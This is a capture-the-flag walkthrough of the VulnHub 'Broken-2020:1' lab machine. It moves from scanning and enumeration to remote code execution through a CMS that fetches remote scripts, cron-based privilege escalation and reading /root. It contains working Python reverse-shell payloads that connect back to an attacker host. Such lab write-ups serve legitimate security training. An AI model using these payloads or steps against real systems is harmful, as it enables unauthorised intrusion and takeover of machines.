# VulnHub-Broken-2020:1 
## Target IP Address 
>>
     nmap -T5 192.168.1.1/24
 
#### IP Address: **192.168.1.232**
* * * 
## Scanning & Enumeration
<br />

* * * 
### <ins>nmap 
>>
     nmap -A -O -p- -T5 -oN nmap.txt 192.168.1.232

PORT   STATE SERVICE VERSION
**22/tcp** open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 7e:f3:33:8c:be:0c:ed:d7:0e:c6:67:cc:73:bf:c0:ab (RSA)
|   256 ee:ed:74:02:0d:3f:7d:6d:45:aa:ff:f3:3a:d0:1a:d9 (ECDSA)
|_  256 d1:18:a9:ef:7f:b6:c8:a9:30:52:c8:e6:b6:ec:64:80 (ED25519)
**80/tcp** open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Coming Soon
MAC Address: 08:00:27:2A:C0:85 (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![](@attachment/Clipboard_2020-09-27-22-16-36.png)
* * * 
<br />

* * * 
### <ins>nikto
>>
     nikto -h http://192.168.1.232

![](@attachment/Clipboard_2020-09-27-22-30-36.png)
* * *
<br />

* * * 
### <ins> dirbuster
![](@attachment/Clipboard_2020-09-27-22-32-09.png)
* * * 
<br />

* * * 
### <ins>http://192.168.1.232

![](@attachment/Clipboard_2020-09-27-22-26-02.png)

#### <ins> /images
![](@attachment/Clipboard_2020-09-27-22-30-01.png)
#### <ins> /cms
![](@attachment/Clipboard_2020-09-27-22-35-23.png)
> TrustMeCMS doesn't exist
#### <ins> /cms/index.php
> On clicking install

![](@attachment/Clipboard_2020-09-27-22-42-34.png)
 - Website defaced from installation of the cms 
 - Enumerating CMS

![](@attachment/Clipboard_2020-09-27-22-40-47.png)
> ## **Flag- 1**  
* * * 
<br />

## <ins> dirb on "/cms"

 DIRECTORY: **http://192.168.1.232/cms/cc/**

![](@attachment/Clipboard_2020-09-27-22-44-34.png)  
* * * 
<br />

### <ins>/cms/cc

![](@attachment/Clipboard_2020-09-27-22-45-38.png)
<br />

## Exploitation 
- The page is looking for a file from a remote server 

![](@attachment/Clipboard_2020-09-27-22-49-37.png)
- Set up a python server to see what it is looking for.

![](@attachment/Clipboard_2020-09-27-22-52-39.png)

![](@attachment/Clipboard_2020-09-27-22-55-45.png)
 - It is looking for a shell with the given name:
/1ce1dec6d9e6f67186e1bd9f50e5cdb5.sh

- Try running a shellscript: 
>>
     id
![](@attachment/Clipboard_2020-09-27-23-03-11.png)

- We have RCE
- Spwan a reverse shell, with nc listening on 1234
>>
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
![](@attachment/Clipboard_2020-09-27-23-05-21.png)

- We have a reverse shell 

![](@attachment/Clipboard_2020-09-27-23-06-51.png)

![](@attachment/Clipboard_2020-09-27-23-12-22.png)
> ## **Flag- 2** 
<br />

### Enumerating 

![](@attachment/Clipboard_2020-09-27-23-15-26.png)

![](@attachment/Clipboard_2020-09-27-23-16-40.png)

- We can write a python script to spawn a shell and then, replace log.py with it.
>>
    import socket
    import subprocess
    import os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.6",4444));os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

![](@attachment/Clipboard_2020-09-27-23-20-44.png)

![](@attachment/Clipboard_2020-09-27-23-23-26.png)

- Wait for a few seconds for the python file to get executed. 
* * * 

- ### **Obtained Reverse Shell**
  - We have become user Alice 

![](@attachment/Clipboard_2020-09-27-23-24-55.png)

- Enumerating 

![](@attachment/Clipboard_2020-09-27-23-27-00.png)

> ## **Flag- 3** 

![](@attachment/Clipboard_2020-09-27-23-29-36.png)

- We found a note 

![](@attachment/Clipboard_2020-09-27-23-30-49.png)

![](@attachment/Clipboard_2020-09-27-23-35-12.png)

- This meant that a job was running every minute. 
- It is looking for the backup file which is in /back
![](@attachment/Clipboard_2020-09-27-23-45-49.png)

- Contents:

![](@attachment/Clipboard_2020-09-27-23-45-09.png)

- Here the  bot (scripts) are picking up the contents in the directory specified in “path.txt” and copying it in the current directory
- Hence we can read the contents of /root by 
>>
      echo "/root" > path.txt
 * * * 
 <br />

 # **-<ins>Root Flag</ins>-** 

![](@attachment/Clipboard_2020-09-27-23-43-19.png)

* * * 
* * * 
